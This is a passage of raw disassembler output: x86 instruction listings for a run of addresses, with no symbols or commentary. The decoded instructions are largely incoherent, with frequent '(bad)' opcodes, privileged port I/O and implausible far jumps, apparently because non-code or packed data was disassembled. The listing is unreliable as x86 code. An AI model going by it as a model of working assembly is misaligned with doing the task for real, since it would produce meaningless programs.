  41863c:	mov    BYTE PTR [ebx+esi*1+0x60a84f69],dh
  418643:	sti    
  418644:	(bad)  [eax+0x69ad854]
  41864a:	clc    
  41864b:	dec    edx
  41864c:	lock icebp 
  41864e:	imul   eax,DWORD PTR [edi],0xffffffe4
  418651:	push   0x5d694548
  418656:	push   0x757e4e1
  41865b:	cmp    al,0x92
  41865d:	or     bh,ah
  41865f:	mov    edx,0x9ee68
  418664:	je     0x41860c
  418666:	xor    eax,0x8cefc145
  41866b:	(bad)  [esi-0x7883d73d]
  418671:	adc    al,0x8a
  418673:	mov    dl,0x7b
  418675:	cdq    
  418676:	dec    eax
  418677:	sub    edx,esp
  418679:	pop    ebx
  41867a:	sub    al,cl
  41867c:	jmp    0x4186de
  41867e:	rcl    DWORD PTR [ebx-0x5d],1
  418681:	(bad)  
  418682:	in     al,dx
  418683:	push   0x1eb8db7e
  418688:	in     eax,0x6e
  41868a:	sbb    eax,0xe12d76f7
  41868f:	mov    esp,es
  418691:	sub    dl,BYTE PTR [edi]
  418693:	(bad)  
  418695:	or     al,BYTE PTR [esi-0x47]
  418698:	adc    al,0x76
  41869a:	ds (bad) 
  41869c:	mov    bl,0x30
  41869e:	jecxz  0x4186d0
  4186a0:	dec    eax
  4186a1:	and    BYTE PTR [ebx-0x4286207f],bh
  4186a7:	ins    BYTE PTR es:[edi],dx
  4186a8:	outs   dx,BYTE PTR ds:[esi]
  4186a9:	lds    eax,FWORD PTR [eax+0x1fa9e182]
  4186af:	jmp    0x159bd209
  4186b4:	dec    edi
  4186b5:	sbb    dl,BYTE PTR [ebx-0x30]
  4186b8:	js     0x4186c2
  4186ba:	sub    esi,DWORD PTR [edx-0x3a]
  4186bd:	jns    0x418725
  4186bf:	or     edx,DWORD PTR [ebp-0x74]
  4186c2:	push   0xffffff81
  4186c4:	pusha  
  4186c5:	in     al,dx
  4186c6:	ret    0x555e
  4186c9:	bound  ebp,QWORD PTR [ebp+0x5a]
  4186cc:	ja     0x41868a
  4186ce:	push   eax
  4186cf:	inc    ebp
  4186d0:	cmp    al,0xa5
  4186d2:	xor    DWORD PTR [ebx],0x112bd2fd
  4186d8:	and    dh,dh
  4186da:	cs sti 
  4186dc:	js     0x418687
  4186de:	pushf  
  4186df:	xchg   edx,eax
  4186e0:	in     al,0x41
  4186e2:	xor    DWORD PTR ss:[edi],ecx
  4186e5:	or     BYTE PTR ds:0x77638a80,al
  4186eb:	mov    dh,BYTE PTR [esi+0x353385e1]
  4186f1:	sar    bh,1
  4186f3:	rol    DWORD PTR [ebp+0x35989ab8],cl
  4186f9:	cmp    eax,0x1f01c78
  4186fe:	in     eax,0x4b
  418700:	(bad)  
  418701:	mov    ds:0x81fa4e76,eax
  418706:	xor    BYTE PTR [edx],al
  418708:	mov    eax,ds:0xe93fc4e9
  41870d:	adc    eax,0xff4da07c
  418712:	test   BYTE PTR [ebx+edx*4-0x1b],bh
  418716:	pop    es
  418717:	or     BYTE PTR [esi+0x5844ae42],cl
  41871d:	mov    ch,0x25
  41871f:	fimul  WORD PTR [ebx]
  418721:	xor    eax,0x8c444117
  418726:	jmp    0x41874d
  418728:	(bad)  
  418729:	ret    
  41872a:	into   
  41872b:	test   BYTE PTR [ebp-0x653eb793],0xa9
  418732:	xchg   esp,eax
  418733:	and    bh,BYTE PTR [edi]
  418735:	xor    dh,BYTE PTR [ecx-0x35bfdb0d]
  41873b:	push   edi
  41873c:	and    BYTE PTR [ebx-0x5f],bh
  41873f:	sahf   
  418740:	cmp    BYTE PTR [esi+0x20a6313f],bl
  418746:	iret   
  418747:	sar    DWORD PTR [ecx],1
  418749:	leave  
  41874a:	jg     0x4187a7
  41874c:	shl    DWORD PTR [ebx],cl
  41874e:	inc    edx
  41874f:	scas   eax,DWORD PTR es:[edi]
  418750:	ret    
  418751:	pop    eax
  418752:	daa    
  418753:	pop    ecx
  418754:	xchg   edi,eax
  418755:	pop    ebp
  418756:	out    0x80,al
  418758:	pushf  
  418759:	aas    
  41875a:	out    0xf1,al
  41875c:	leave  
  41875d:	imul   edx,DWORD PTR [ebx-0x54],0x7a61eb5
  418764:	fcmovnu st,st(6)
  418766:	out    dx,al
  418767:	leave  
  418768:	int3   
  418769:	fist   DWORD PTR [edx-0x10]
  41876c:	wbinvd 
  41876e:	xchg   ecx,eax
  41876f:	push   esi
  418770:	sbb    ebp,esi
  418772:	hlt    
  418773:	push   0x49be85a9
  418778:	jge    0x4187e5
  41877a:	jae    0x41871b
  41877c:	dec    ebx
  41877d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41877e:	ja     0x4187a2
  418780:	clc    
  418781:	mov    eax,0xceb3d7c5
  418786:	stos   DWORD PTR es:[edi],eax
  418787:	adc    al,0xcd
  418789:	(bad)  
  41878a:	mov    al,0x49
  41878c:	mov    eax,0xf8a8b584
  418791:	inc    ebx
  418792:	push   ebx
  418793:	bound  edi,QWORD PTR [eax+0x2c0c2bd2]
  418799:	(bad)
  41879c:	shl    DWORD PTR [ecx],1
  41879e:	push   edi
  41879f:	cmp    eax,DWORD PTR [edx-0x21a4c080]
  4187a5:	sbb    ch,BYTE PTR [ecx+0x3]
  4187a8:	(bad)  
  4187a9:	repnz (bad) 
  4187ab:	jb     0x41873a
  4187ad:	mov    ebx,0xbd034bb0
  4187b2:	clc    
  4187b3:	pop    ds
  4187b4:	xor    dh,0x7b
  4187b7:	jecxz  0x41881a
  4187b9:	into   
  4187ba:	dec    eax
  4187bb:	add    eax,0x2a5fe016
  4187c0:	hlt    
  4187c1:	leave  
  4187c2:	outs   dx,BYTE PTR ds:[esi]
  4187c3:	inc    edi
  4187c4:	popf   
  4187c5:	pusha  
  4187c6:	out    0xb7,al
  4187c8:	adc    dl,ah
  4187ca:	and    BYTE PTR [ecx-0x72daa8],bh
  4187d0:	call   0x9a67:0xfa60efd2
  4187d7:	pop    es
  4187d8:	jb     0x4187ab
  4187da:	inc    ecx
  4187db:	les    esp,FWORD PTR [esp+eax*8-0x43]
  4187df:	cmp    al,0x63
  4187e1:	inc    edi
  4187e2:	dec    esi
  4187e3:	cld    
  4187e4:	dec    ebx
  4187e5:	pop    es
  4187e6:	js     0x418865
  4187e8:	mov    BYTE PTR [ecx+0x309421b6],al
  4187ee:	hlt    
  4187ef:	mov    BYTE PTR [edx+0x28ed12e5],ch
  4187f5:	repnz sub al,0xee
  4187f8:	pushf  
  4187f9:	sar    BYTE PTR [edx],1
  4187fb:	adc    ch,cl
  4187fd:	je     0x418826
  4187ff:	inc    ebp
  418800:	repz jnp 0x418843
  418803:	dec    esp
  418804:	int3   
  418805:	jecxz  0x4187b6
  418807:	jmp    0xcc8db8c7
  41880c:	aam    0x4d
  41880e:	aam    0xa0
  418810:	imul   ebx,edi,0xffffffdd
  418813:	fstp   st(0)
  418815:	and    ch,BYTE PTR [esi+esi*1-0x5b05d38e]
  41881c:	in     eax,0x19
  41881e:	fdivr  QWORD PTR [ebp-0x1ddd516]
  418824:	sub    ebx,ecx
  418826:	sub    al,0x7a
  418828:	ss pop esp
  41882a:	jae    0x418802
  41882c:	adc    eax,0xa46882ad
  418831:	cs dec edx
  418833:	sub    ch,bh
  418835:	sti    
  418836:	dec    ebp
  418837:	fld    TBYTE PTR [ecx-0x74]
  41883a:	mov    ch,0x29
  41883c:	xchg   esp,eax
  41883d:	jl     0x41888e
  41883f:	jg     0x4188bf
  418841:	add    eax,0x593573e4
  418846:	mov    BYTE PTR ds:0xe2a95b2c,bh
  41884c:	dec    eax
  41884d:	inc    ecx
  41884e:	nop
  41884f:	add    eax,0xfb240be1
  418854:	(bad)  
  418856:	mov    eax,0x4ec67f9e
  41885b:	jmp    0x418813
  41885d:	mov    ah,0x9b
  41885f:	jmp    0x9e64:0x8d50e3a8
  418866:	ss mov ebx,0x7fa68796
  41886c:	mov    al,0x3c
  41886e:	fst    QWORD PTR [ecx+esi*2]
  418871:	xor    esi,0x38
  418874:	fnstsw WORD PTR [edx+ecx*1+0x603f84db]
  41887b:	mov    es,ecx
  41887d:	mov    bl,BYTE PTR [ebx+0x2c]
  418880:	dec    ebx
  418881:	xchg   edi,eax
  418882:	in     eax,0x88
  418884:	in     al,dx
  418885:	inc    eax
  418886:	push   esp
  418887:	sub    al,0x28
  418889:	sbb    al,ch
  41888b:	iret   
  41888c:	xchg   ecx,eax
  41888d:	sub    eax,0x12c1b28f
  418892:	sti    
  418893:	mov    al,0x34
  418895:	mov    al,ds:0xbcba50ed
  41889a:	sbb    esp,ebx
  41889c:	xor    cl,BYTE PTR [eax]
  41889e:	xchg   ah,dh
  4188a0:	jecxz  0x4188c1
  4188a2:	aaa    
  4188a3:	fldenv [eax+0x1345facc]
  4188a9:	rol    DWORD PTR [ecx],0xb6
  4188ac:	stc    
  4188ad:	dec    ecx
  4188ae:	js     0x418918
  4188b0:	inc    ecx
  4188b1:	lea    eax,[ecx-0x18f75afb]
  4188b7:	or     ah,BYTE PTR ds:0x4fc5af9f
  4188bd:	mov    edi,0xbfc4fc75
  4188c2:	fimul  WORD PTR [eax]
  4188c4:	mov    ds:0xe42341c0,eax
  4188c9:	jmp    0x418934
  4188cb:	adc    al,0x9f
  4188cd:	outs   dx,DWORD PTR ds:[esi]
  4188ce:	jns    0x418897
  4188d0:	mov    ch,0xf2
  4188d2:	retf   0xe9be
  4188d5:	in     al,0x8a
  4188d7:	ss jns 0x418893
  4188da:	idiv   BYTE PTR [ebp+edi*1+0x1ccd2d5e]
  4188e1:	dec    ebp
  4188e2:	test   eax,0x2532e10f
  4188e8:	es or  al,0x83
  4188eb:	mov    ecx,0x20c06490
  4188f0:	out    0x72,eax
  4188f2:	je     0x418889
  4188f4:	xchg   BYTE PTR [ebp-0x6f],cl
  4188f7:	scas   al,BYTE PTR es:[edi]
  4188f8:	sti    
  4188f9:	jge    0x41889b
  4188fb:	fbstp  TBYTE PTR [edx+0x7e]
  4188fe:	outs   dx,DWORD PTR ds:[esi]
  4188ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418900:	daa    
  418901:	xchg   al,bh
  418903:	push   esp
  418904:	lea    esp,[edx]
  418906:	or     esp,edi
  418908:	inc    esp
  418909:	(bad)  
  41890a:	in     al,0xe2
  41890c:	(bad)  
  41890d:	mov    ah,0x2b
  41890f:	sbb    eax,0xfabb19f
  418914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418915:	scas   eax,DWORD PTR es:[edi]
  418916:	data16 cld 
  418918:	lods   al,BYTE PTR ds:[esi]
  418919:	loope  0x4188be
  41891b:	push   esp
  41891c:	cmp    BYTE PTR fs:[ecx-0x60],ah
  418920:	ins    DWORD PTR es:[edi],dx
  418921:	jae    0x418977
  418923:	ss push esi
  418925:	pusha  
  418926:	shl    edx,0x47
  418929:	xchg   edx,eax
  41892a:	into   
  41892b:	enter  0x65b1,0xf0
  41892f:	or     DWORD PTR ds:0x1e0c7bd,ebx
  418935:	fstp   DWORD PTR [edi+0x53]
  418938:	inc    esp
  418939:	add    eax,0xacfc7aca
  41893e:	or     al,0xc
  418940:	mov    ebp,0xc39c5f4b
  418945:	or     esi,DWORD PTR [eax+0x75cf4158]
  41894b:	ss push cs
  41894d:	push   esi
  41894e:	mov    al,ds:0xc8d60cc
  418953:	xchg   ecx,eax
  418954:	xor    cl,BYTE PTR [edx+0x16]
  418957:	or     eax,0x9d467ead
  41895c:	out    0x96,eax
  41895e:	out    0xa1,al
  418960:	enter  0xc76e,0xa9
  418964:	repz ror BYTE PTR [eax],cl
  418967:	data16 jno 0x4188ee
  41896a:	mov    ecx,0xed78d13d
  41896f:	push   ebp
  418970:	rcl    DWORD PTR [edx-0x42],cl
  418973:	icebp  
  418974:	fst    QWORD PTR [eax+0x72]
  418977:	test   cl,0xd
  41897a:	test   al,0xe9
  41897c:	push   esp
  41897d:	addr16 sbb eax,0x6eda6933
  418983:	add    al,0x5d
  418985:	pop    ecx
  418986:	mov    ah,0xf7
  418988:	test   ebx,eax
  41898a:	lock aaa 
  41898c:	imul   ecx,ecx,0x77eeb8de
  418992:	lods   eax,DWORD PTR ds:[esi]
  418993:	dec    edi
  418994:	pop    edi
  418995:	inc    ebp
  418996:	adc    BYTE PTR [ebx],al
  418998:	imul   edx,DWORD PTR [ecx+0x4],0xfd884b49
  41899f:	nop
  4189a0:	and    DWORD PTR [edx+0x2c],ebx
  4189a3:	xchg   ecx,eax
  4189a4:	scas   eax,DWORD PTR es:[edi]
  4189a5:	iret   
  4189a6:	stc    
  4189a7:	div    ch
  4189a9:	push   0x77
  4189ab:	mov    ebp,0x3dec482b
  4189b0:	sub    BYTE PTR [ebp+0x35],bl
  4189b3:	sub    BYTE PTR [ecx-0x5964827e],ah
  4189b9:	pop    edx
  4189ba:	fwait
  4189bb:	(bad)
  4189be:	fwait
  4189bf:	in     al,dx
  4189c0:	sub    al,0x59
  4189c2:	cmc    
  4189c3:	mov    esp,0xc4b408b2
  4189c8:	cmp    eax,0x4af4308a
  4189cd:	xchg   ecx,eax
  4189ce:	arpl   WORD PTR [esi-0x5b],bx
  4189d1:	pop    es
  4189d2:	mov    eax,0x3eb2be05
  4189d7:	dec    ecx
  4189d8:	mov    al,0x68
  4189da:	lea    edx,[ecx+ecx*2-0x7dc47342]
  4189e1:	repnz sbb eax,0xf548c883
  4189e7:	add    eax,0xb4b0cc29
  4189ec:	stos   BYTE PTR es:[edi],al
  4189ed:	add    al,0x75
  4189ef:	push   edi
  4189f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f1:	fcomp  DWORD PTR [edx+0x5d803108]
  4189f7:	fst    DWORD PTR [esi+0x5b]
  4189fa:	and    edx,DWORD PTR [edx]
  4189fc:	call   0x79c04809
  418a01:	stos   BYTE PTR es:[edi],al
  418a02:	jo     0x418a62
  418a04:	pop    edx
  418a05:	push   0xffffffe7
  418a07:	push   cs
  418a08:	daa    
  418a09:	add    eax,0x493466c5
  418a0e:	or     eax,DWORD PTR [esi-0x9]
  418a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a12:	mov    ebp,0xa371462
  418a17:	jb     0x4189ab
  418a19:	sub    DWORD PTR [edx+ecx*1],edi
  418a1c:	sbb    dl,BYTE PTR [edx]
  418a1e:	retf   0xdc2f
  418a21:	dec    ebx
  418a22:	loopne 0x418a85
  418a24:	sub    BYTE PTR [ebx-0x3950cbb8],dh
  418a2a:	sar    BYTE PTR [edi+0x8],cl
  418a2d:	js     0x418a29
  418a2f:	jmp    ebx
  418a31:	shl    DWORD PTR [edi+0x74],1
  418a34:	xor    BYTE PTR [ecx+0x12],bh
  418a37:	xabort 0x58
  418a3a:	das    
  418a3b:	adc    al,0x5f
  418a3d:	pop    ebp
  418a3e:	pop    edi
  418a3f:	in     al,0x3a
  418a41:	int    0x92
  418a43:	mov    ah,0x6c
  418a45:	jne    0x418a02
  418a47:	rcr    DWORD PTR [edx+0x37],1
  418a4a:	inc    eax
  418a4b:	mov    WORD PTR [eax+0x68478920],?
  418a51:	inc    ebx
  418a52:	scas   eax,DWORD PTR es:[edi]
  418a53:	mov    WORD PTR [edx+0x4b],es
  418a56:	sub    BYTE PTR [esp+ebx*2+0x64],al
  418a5a:	outs   dx,DWORD PTR ds:[esi]
  418a5b:	enter  0x1655,0xef
  418a5f:	not    ch
  418a61:	ins    DWORD PTR es:[edi],dx
  418a62:	ror    DWORD PTR [ebp+0x2e],1
  418a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a66:	jmp    0xb8db7445
  418a6b:	test   edx,edi
  418a6d:	mov    ds:0x6fd7831c,al
  418a72:	jmp    0x8723:0x8c7f6281
  418a79:	mov    esp,0x7779a103
  418a7e:	jb     0x418a5f
  418a80:	idiv   DWORD PTR [eax+esi*4+0x23]
  418a84:	lock pop es
  418a86:	sub    BYTE PTR [ecx+0x30838dcb],ch
  418a8c:	or     al,0x80
  418a8e:	in     al,0xff
  418a90:	ja     0x418a30
  418a92:	ins    BYTE PTR es:[edi],dx
  418a93:	jns    0x418b03
  418a95:	sub    al,0x98
  418a97:	repnz xchg ebx,eax
  418a99:	sti    
  418a9a:	or     bh,dl
  418a9c:	stos   DWORD PTR es:[edi],eax
  418a9d:	mov    al,0x7d
  418a9f:	dec    edx
  418aa0:	pop    ds
  418aa1:	dec    esp
  418aa2:	sbb    cl,dh
  418aa4:	dec    esi
  418aa5:	into   
  418aa6:	cdq    
  418aa7:	inc    ebx
  418aa8:	arpl   bp,di
  418aaa:	stc    
  418aab:	aad    0x70
  418aad:	fucomp st(3)
  418aaf:	add    DWORD PTR ds:0x1ac0dc3b,esi
  418ab5:	(bad)  
  418ab7:	(bad)  
  418ab8:	in     al,0xb
  418aba:	cmp    BYTE PTR [edx-0x6c],al
  418abd:	cs push edi
  418abf:	adc    edi,DWORD PTR [esi-0x4c3e11a4]
  418ac5:	arpl   sp,cx
  418ac7:	push   ebx
  418ac8:	mov    dh,0x67
  418aca:	not    ecx
  418acc:	add    esp,DWORD PTR [ecx-0x888b15c]
  418ad2:	adc    esi,ebp
  418ad4:	rol    ch,0x76
  418ad7:	arpl   WORD PTR [edx+0xb],sp
  418ada:	adc    ecx,DWORD PTR [edi+edx*1]
  418add:	and    DWORD PTR [ebp+0xcc0d684],edi
  418ae3:	push   ecx
  418ae4:	jbe    0x418aea
  418ae6:	into   
  418ae7:	enter  0xb5b,0x59
  418aeb:	push   ecx
  418aec:	dec    eax
  418aed:	jns    0x418b2b
  418aef:	xor    edi,DWORD PTR [edx]
  418af1:	aam    0xd2
  418af3:	bound  ebp,QWORD PTR [ecx+0x3b]
  418af6:	sbb    ecx,DWORD PTR [esi]
  418af8:	clc    
  418af9:	scas   al,BYTE PTR es:[edi]
  418afa:	and    DWORD PTR [ecx+ebx*4+0x3dd9cee2],0x44
  418b02:	add    eax,0xca2768ca
  418b07:	icebp  
  418b08:	push   0x4a
  418b0a:	mov    al,ds:0xa8b2a555
  418b0f:	push   ds
  418b10:	loope  0x418a96
  418b12:	outs   dx,BYTE PTR ds:[esi]
  418b13:	pop    ebp
  418b14:	mov    dh,0xcc
  418b16:	out    dx,al
  418b17:	rol    BYTE PTR [ecx+eax*2],cl
  418b1a:	pop    ss
  418b1b:	icebp  
  418b1c:	mov    esp,0x27e41589
  418b21:	push   ss
  418b22:	lahf   
  418b23:	jle    0x418aeb
  418b25:	addr16 pop ebp
  418b27:	adc    eax,edi
  418b29:	rcl    BYTE PTR [ecx+0x670f7e23],0x83
  418b30:	cmp    cl,bl
  418b32:	push   DWORD PTR [edi-0xf042f1c]
  418b38:	push   0xf996cd80
  418b3d:	iret   
  418b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b3f:	test   BYTE PTR [ebp+0x7b6ca205],dl
  418b45:	je     0x418b7c
  418b47:	dec    esi
  418b48:	ror    BYTE PTR es:[eax+0x38c6b09b],0x41
  418b50:	hlt    
  418b51:	push   ecx
  418b52:	pusha  
  418b53:	sub    ecx,DWORD PTR [edi+0x64d456d2]
  418b59:	mov    bh,0x8a
  418b5b:	lea    ebx,[edx+0x7e]
  418b5e:	popa   
  418b5f:	inc    edi
  418b60:	(bad)  
  418b61:	sub    al,0x72
  418b63:	and    al,0x17
  418b65:	xchg   BYTE PTR [ebp-0xb47d3ab],bl
  418b6b:	test   eax,0x44c9dbb2
  418b70:	xor    bl,BYTE PTR [esi]
  418b72:	(bad)  
  418b73:	retf   
  418b74:	adc    eax,0x826912b3
  418b79:	add    BYTE PTR [ecx-0x46ea4e97],cl
  418b7f:	jae    0x418b78
  418b81:	js     0x418b96
  418b83:	inc    esi
  418b84:	jmp    0x1cf6:0x1a3bf6d9
  418b8b:	push   ebx
  418b8c:	(bad)  
  418b8d:	jmp    0xa5c8:0xdaee18de
  418b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b95:	jp     0x418bcd
  418b97:	adc    ebp,DWORD PTR [edx]
  418b99:	ret    0xe3e1
  418b9c:	xchg   esp,eax
  418b9d:	imul   DWORD PTR [edx]
  418b9f:	fs inc esi
  418ba1:	inc    esp
  418ba2:	ret    0x55c1
  418ba5:	clc    
  418ba6:	arpl   WORD PTR [edi+0x6c27a339],bp
  418bac:	ror    BYTE PTR [esi+0x66e68df8],1
  418bb2:	stos   BYTE PTR es:[edi],al
  418bb3:	cli    
  418bb4:	out    dx,al
  418bb5:	mov    DWORD PTR [ecx+0x79],ecx
  418bb8:	enter  0xff7a,0xcb
  418bbc:	dec    edi
  418bbd:	fwait
  418bbe:	leave  
  418bbf:	aas    
  418bc0:	adc    BYTE PTR [eax+0x6e],bh
  418bc3:	push   0xae5a2bcc
  418bc8:	(bad)  
  418bca:	mov    al,ds:0xa788289
  418bcf:	cmp    esp,DWORD PTR [edx-0x75e058fd]
  418bd5:	add    BYTE PTR [ebx],al
  418bd7:	(bad)  
  418bd8:	pop    esi
  418bd9:	les    ecx,FWORD PTR [ebx-0x6b]
  418bdc:	or     DWORD PTR [edi+0x2e85aa4c],esi
  418be2:	in     al,dx
  418be3:	retf   
  418be4:	adc    eax,0xf035225c
  418be9:	xor    DWORD PTR [ebx-0x58c0e70b],eax
  418bef:	not    DWORD PTR [ecx-0x2c]
  418bf2:	sub    al,0xfd
  418bf4:	loopne 0x418b86
  418bf6:	mov    esi,0x3c942012
  418bfb:	mov    eax,ds:0x779066df
  418c00:	jae    0x418b9c
  418c02:	fdivr  QWORD PTR ds:0x69d01aaa
  418c08:	xchg   ebp,eax
  418c09:	mov    cl,0xf9
  418c0b:	and    ebp,ecx
  418c0d:	dec    eax
  418c0e:	and    BYTE PTR [ecx-0x7b],ch
  418c11:	lds    eax,FWORD PTR [eax]
  418c13:	sahf   
  418c14:	mov    edi,0x4fa780a3
  418c19:	xor    eax,0x366e4eb2
  418c1e:	cmp    bh,bl
  418c20:	cmp    BYTE PTR [edi],ah
  418c22:	cmp    dl,BYTE PTR [ebx+0x779b69f8]
  418c28:	aaa    
  418c29:	test   eax,0xba1af88a
  418c2e:	sub    ebx,edi
  418c30:	(bad)  ds:0x48f5c67e
  418c37:	(bad)  
  418c39:	pop    edx
  418c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3b:	hlt    
  418c3c:	out    0xae,eax
  418c3e:	fmulp  st(7),st
  418c40:	mov    bl,BYTE PTR [esp+edi*2+0x32]
  418c44:	(bad)  
  418c45:	int    0x89
  418c47:	popf   
  418c48:	cdq    
  418c49:	add    dh,BYTE PTR [ebp+eax*2-0x5ec41157]
  418c50:	popf   
  418c51:	inc    esp
  418c52:	sbb    eax,0x7646f5a4
  418c57:	pop    ebp
  418c58:	inc    BYTE PTR [ebx]
  418c5a:	and    eax,0x14ca5907
  418c5f:	adc    esi,DWORD PTR [ebx]
  418c61:	fnsave [edi+0x26]
  418c64:	aam    0x9c
  418c66:	push   ecx
  418c67:	lahf   
  418c68:	cdq    
  418c69:	mov    ebp,0xc6b353b6
  418c6e:	test   eax,ecx
  418c70:	rol    BYTE PTR [esi],cl
  418c72:	xor    dh,BYTE PTR [eax+eax*1]
  418c75:	pop    edi
  418c76:	sub    ecx,DWORD PTR [edx+0x5e]
  418c79:	jecxz  0x418c96
  418c7b:	lds    ecx,FWORD PTR [edx]
  418c7d:	enter  0x594d,0xe3
  418c81:	and    bh,BYTE PTR [esi-0x7f135e1d]
  418c87:	sbb    al,0xc3
  418c89:	icebp  
  418c8a:	data16 jecxz 0x418d02
  418c8d:	loop   0x418c55
  418c8f:	shr    BYTE PTR [ecx+0x487f5c3b],1
  418c95:	cmp    eax,0x79a942db
  418c9a:	clc    
  418c9b:	xchg   esi,eax
  418c9c:	repz sub eax,DWORD PTR [edi+0x38]
  418ca0:	test   al,0x28
  418ca2:	aad    0xf1
  418ca4:	sub    BYTE PTR [ecx+ebp*4],0x7c
  418ca8:	jle    0x418c8e
  418caa:	push   edx
  418cab:	sub    DWORD PTR ds:0x53db1f29,ecx
  418cb1:	and    DWORD PTR [ebp+0xe],0xad2c4921
  418cb8:	inc    edx
  418cb9:	test   eax,0xf499e817
  418cbe:	mov    DWORD PTR [eax-0x6e],edx
  418cc1:	out    dx,al
  418cc2:	push   esp
  418cc3:	adc    DWORD PTR [edx],0xb0f8d95d
  418cc9:	clflush BYTE PTR [edx-0xf290e7b]
  418cd0:	jnp    0x418cb9
  418cd2:	sbb    esp,DWORD PTR [edx+0x6a]
  418cd5:	sbb    BYTE PTR [edx+0x0],dl
  418cd8:	xchg   BYTE PTR [ecx],ah
  418cda:	add    al,BYTE PTR [eax-0x1]
  418cdd:	dec    esi
  418cde:	and    DWORD PTR [esp+edi*8],0x6fb8b8f5
  418ce5:	in     eax,dx
  418ce6:	jle    0x418d1c
  418ce8:	or     BYTE PTR fs:[edx],ah
  418ceb:	lea    ecx,[edx-0x31952ea5]
  418cf1:	sub    BYTE PTR [ebx],ah
  418cf3:	sbb    ebx,edx
  418cf5:	pop    esp
  418cf6:	int3   
  418cf7:	fld    st(4)
  418cf9:	mov    ds:0x8c238c09,eax
  418cfe:	adc    eax,0xf97f4e00
  418d03:	retf   0xd5dc
  418d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d07:	jns    0x418d12
  418d09:	mov    ecx,edi
  418d0b:	out    dx,al
  418d0c:	and    esi,DWORD PTR [esi+0x481ccd88]
  418d12:	inc    BYTE PTR [edx-0x5f]
  418d15:	push   ss
  418d16:	pop    ebp
  418d17:	sbb    dx,0xfffb
  418d1b:	in     al,dx
  418d1c:	sub    dl,dh
  418d1e:	mov    ch,0x8f
  418d20:	pop    ebp
  418d21:	fmul   DWORD PTR [edx+0x55931ab2]
  418d27:	fidivr WORD PTR [eax+eax*4]
  418d2a:	and    BYTE PTR [edx-0x53],al
  418d2d:	sbb    dl,cl
  418d2f:	idiv   BYTE PTR [edi+eax*8-0x79ed3c4f]
  418d36:	push   esp
  418d37:	daa    
  418d38:	inc    edi
  418d39:	and    eax,0x4d80d908
  418d3e:	aas    
  418d3f:	or     al,al
  418d41:	mov    dl,0x95
  418d43:	call   0x23ff:0xd71aee6e
  418d4a:	faddp  st(4),st
  418d4c:	mov    ds:0x632cb037,eax
  418d51:	scas   al,BYTE PTR es:[edi]
  418d52:	and    al,0x40
  418d54:	scas   eax,DWORD PTR es:[edi]
  418d55:	jle    0x418cfa
  418d57:	mov    eax,ds:0x702bd9ea
  418d5c:	push   esp
  418d5d:	or     BYTE PTR [eax],0x2f
  418d60:	push   ebx
  418d61:	(bad)  
  418d63:	lahf   
  418d64:	xor    eax,0x2fd136ea
  418d69:	cmp    BYTE PTR fs:[ebx-0x1b01231e],0x91
  418d71:	ror    DWORD PTR [esi-0x7f985c8],cl
  418d77:	push   esp
  418d78:	icebp  
  418d79:	sbb    al,0x9
  418d7b:	jge    0x418d81
  418d7d:	or     eax,0xd3841009
  418d82:	dec    esp
  418d83:	sub    bh,ch
  418d85:	daa    
  418d86:	pop    ebp
  418d87:	aam    0x40
  418d89:	int    0x76
  418d8b:	pop    esp
  418d8c:	fcmovnb st,st(0)
  418d8e:	jns    0x418deb
  418d90:	mov    al,0x50
  418d92:	repnz dec eax
  418d94:	jl     0x418da1
  418d96:	mov    edi,0x6ff3cddb
  418d9b:	lock rol DWORD PTR [edx],1
  418d9e:	inc    ebx
  418d9f:	pop    edi
  418da0:	mov    ah,0x76
  418da2:	ret    
  418da3:	icebp  
  418da4:	stc    
  418da5:	sub    DWORD PTR ds:0xae09aa03,ebx
  418dab:	mov    dl,0x91
  418dad:	iret   
  418dae:	iret   
  418daf:	adc    bh,BYTE PTR [ecx-0xc]
  418db2:	adc    BYTE PTR [ecx],dl
  418db4:	out    0xfe,al
  418db6:	(bad)  
  418db7:	mov    bp,0xd90b
  418dbb:	xor    eax,0x59134586
  418dc0:	test   eax,0x6763ffc1
  418dc5:	into   
  418dc6:	loope  0x418da6
  418dc8:	fucomp st(2)
  418dca:	loopne 0x418e41
  418dcc:	xor    eax,0x6b2c0546
  418dd1:	inc    esi
  418dd2:	es (bad) 
  418dd4:	adc    al,BYTE PTR [edi+0xb]
  418dd7:	xchg   edi,eax
  418dd8:	sbb    ebx,DWORD PTR [ebx-0x390d531d]
  418dde:	mov    edi,0x300b2f0f
  418de3:	sbb    eax,0x1be1828b
  418de8:	sbb    BYTE PTR [eax],0x33
  418deb:	dec    eax
  418dec:	xchg   ebp,eax
  418ded:	push   ecx
  418dee:	stos   DWORD PTR es:[edi],eax
  418def:	mov    dl,0x72
  418df1:	or     al,0x1e
  418df3:	mov    ebx,0xd93747d4
  418df8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418df9:	and    DWORD PTR [ecx-0x3fa00292],0x22
  418e00:	mov    edi,0x1dc97edd
  418e05:	jbe    0x418df0
  418e07:	popf   
  418e08:	scas   al,BYTE PTR es:[edi]
  418e09:	in     al,dx
  418e0a:	push   ss
  418e0b:	cli    
  418e0c:	in     al,dx
  418e0d:	pop    es
  418e0e:	inc    ecx
  418e0f:	pop    edi
  418e10:	xchg   ecx,eax
  418e11:	mov    al,0x27
  418e13:	mov    edx,0x551a25da
  418e18:	jo     0x418e81
  418e1a:	loope  0x418e74
  418e1c:	push   esi
  418e1d:	test   dl,cl
  418e1f:	push   edx
  418e20:	xchg   edx,eax
  418e21:	lods   al,BYTE PTR ds:[esi]
  418e22:	stos   DWORD PTR es:[edi],eax
  418e23:	pushf  
  418e24:	xor    dh,cl
  418e26:	in     al,dx
  418e27:	rol    dh,1
  418e29:	(bad)  
  418e2a:	rol    bh,0x38
  418e2d:	arpl   WORD PTR [ebx],cx
  418e2f:	test   eax,0x81435c29
  418e34:	push   0xe1378a1b
  418e39:	or     ebx,esi
